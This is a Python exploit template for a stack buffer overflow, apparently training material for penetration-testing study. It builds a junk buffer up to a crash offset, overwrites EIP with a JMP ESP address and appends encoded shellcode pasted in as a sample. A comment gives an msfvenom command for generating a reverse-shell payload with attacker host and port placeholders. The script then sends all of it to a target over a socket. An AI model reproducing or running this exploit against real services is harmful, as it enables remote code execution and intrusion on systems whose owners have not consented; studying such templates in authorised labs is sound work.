#!/usr/bin/python
#PROGRAM FOR FUZZING BUFFER OVERFLOWS
#YOU SHOULD HAVE IDENTIFIED A VULNERABLE PARAMETER BY NOW USING generic_send_tcp AND A SPIKE SCRIPT (spk)
import sys, socket
from time import sleep

#Setting buffer...Just a bunch of junk
#THIS NUMBER WILL NEED TO BE CHANGED
buffer = 'A' * [CRASH VALUE]
#OVERWRITING EIP WITH JMP ESP ADDRESS
#!mona jmp -r esp
EIP = '[JMP ESP ADDRESS]'
#SHELLCODE
#GENERATE THIS WITH msfvenom -p [REVERSE SHELL] LHOST=[YOURIP] LPORT=[YOURPORT] -f py -b "[BADCHARS]" -e x86/shikata_ga_nai -v shellcode
#LITERALLY GRABBED THIS SHELLCODE FROM A RANDOM SITE JUST TO SHOW AS AN EXAMPLE:
shellcode =  b""
shellcode += b"\xda\xda\xd9\x74\x24\xf4\xb8\x6c\x6d\x17\xbc"
shellcode += b"\x5b\x2b\xc9\xb1\x52\x31\x43\x17\x83\xeb\xfc"
shellcode += b"\x03\x2f\x7e\xf5\x49\x53\x68\x7b\xb1\xab\x69"
shellcode += b"\x1c\x3b\x4e\x58\x1c\x5f\x1b\xcb\xac\x2b\x49"
shellcode += b"\xe0\x47\x79\x79\x73\x25\x56\x8e\x34\x80\x80"
shellcode += b"\xa1\xc5\xb9\xf1\xa0\x45\xc0\x25\x02\x77\x0b"
shellcode += b"\x38\x43\xb0\x76\xb1\x11\x69\xfc\x64\x85\x1e"
shellcode += b"\x48\xb5\x2e\x6c\x5c\xbd\xd3\x25\x5f\xec\x42"
shellcode += b"\x3d\x06\x2e\x65\x92\x32\x67\x7d\xf7\x7f\x31"
shellcode += b"\xf6\xc3\xf4\xc0\xde\x1d\xf4\x6f\x1f\x92\x07"
shellcode += b"\x71\x58\x15\xf8\x04\x90\x65\x85\x1e\x67\x17"
shellcode += b"\x51\xaa\x73\xbf\x12\x0c\x5f\x41\xf6\xcb\x14"
shellcode += b"\x4d\xb3\x98\x72\x52\x42\x4c\x09\x6e\xcf\x73"
shellcode += b"\xdd\xe6\x8b\x57\xf9\xa3\x48\xf9\x58\x0e\x3e"
shellcode += b"\x06\xba\xf1\x9f\xa2\xb1\x1c\xcb\xde\x98\x48"
shellcode += b"\x38\xd3\x22\x89\x56\x64\x51\xbb\xf9\xde\xfd"
shellcode += b"\xf7\x72\xf9\xfa\xf8\xa8\xbd\x94\x06\x53\xbe"
shellcode += b"\xbd\xcc\x07\xee\xd5\xe5\x27\x65\x25\x09\xf2"
shellcode += b"\x2a\x75\xa5\xad\x8a\x25\x05\x1e\x63\x2f\x8a"
shellcode += b"\x41\x93\x50\x40\xea\x3e\xab\x03\x1f\xbf\xb3"
shellcode += b"\xbd\x77\xbd\xb3\x40\x33\x48\x55\x28\x53\x1d"
shellcode += b"\xce\xc5\xca\x04\x84\x74\x12\x93\xe1\xb7\x98"
shellcode += b"\x10\x16\x79\x69\x5c\x04\xee\x99\x2b\x76\xb9"
shellcode += b"\xa6\x81\x1e\x25\x34\x4e\xde\x20\x25\xd9\x89"
shellcode += b"\x65\x9b\x10\x5f\x98\x82\x8a\x7d\x61\x52\xf4"
shellcode += b"\xc5\xbe\xa7\xfb\xc4\x33\x93\xdf\xd6\x8d\x1c"
shellcode += b"\x64\x82\x41\x4b\x32\x7c\x24\x25\xf4\xd6\xfe"
shellcode += b"\x9a\x5e\xbe\x87\xd0\x60\xb8\x87\x3c\x17\x24"
shellcode += b"\x39\xe9\x6e\x5b\xf6\x7d\x67\x24\xea\x1d\x88"
shellcode += b"\xff\xae\x2e\xc3\x5d\x86\xa6\x8a\x34\x9a\xaa"
shellcode += b"\x2c\xe3\xd9\xd2\xae\x01\xa2\x20\xae\x60\xa7"
shellcode += b"\x6d\x68\x99\xd5\xfe\x1d\x9d\x4a\xfe\x37"


#Establishing socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#Connecting and sending your data
#CHANGE NEEDED BELOW
s.connect(('IP',PORT))
s.send(buffer + EIP + shellcode + "\r\n")
s.recv(1024)
s.close()

#THIS SHOULD SEND THE BUFFER ALL THE WAY TO THE EIP, WHICH WILL REDIRECT TO A JMP ESP, WHICH WILL REDIRECT TO YOUR SHELLCODE.
#NOTE YOU DONT HAVE TO REVERSE SHELL, THERE ARE OTHER FUN PAYLOADS.